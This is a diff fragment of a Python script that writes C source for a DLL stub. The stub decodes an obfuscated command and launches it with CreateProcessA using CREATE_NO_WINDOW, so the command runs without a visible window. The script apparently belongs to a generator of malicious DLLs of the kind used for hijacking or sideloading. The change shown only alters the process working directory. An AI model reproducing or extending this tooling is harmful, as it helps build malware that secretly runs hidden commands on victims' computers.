@@ -44,7 +44,7 @@ def write_stub_c(c_path, command):
         f.write('    decode(command, sizeof(command), key);\n')
         f.write('    STARTUPINFOA si = { sizeof(si) };\n')
         f.write('    PROCESS_INFORMATION pi;\n')
-        f.write('    CreateProcessA(NULL, (char*)command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, "C:\\\\", &si, &pi);\n')
+        f.write('    CreateProcessA(NULL, (char*)command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, "..", &si, &pi);\n')
         f.write('    return 0;\n')
         f.write('}\n\n')
         f.write('BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {\n')
@@ -138,5 +138,6 @@ def main():
 
 if __name__ == "__main__":
     main()
+
 
 
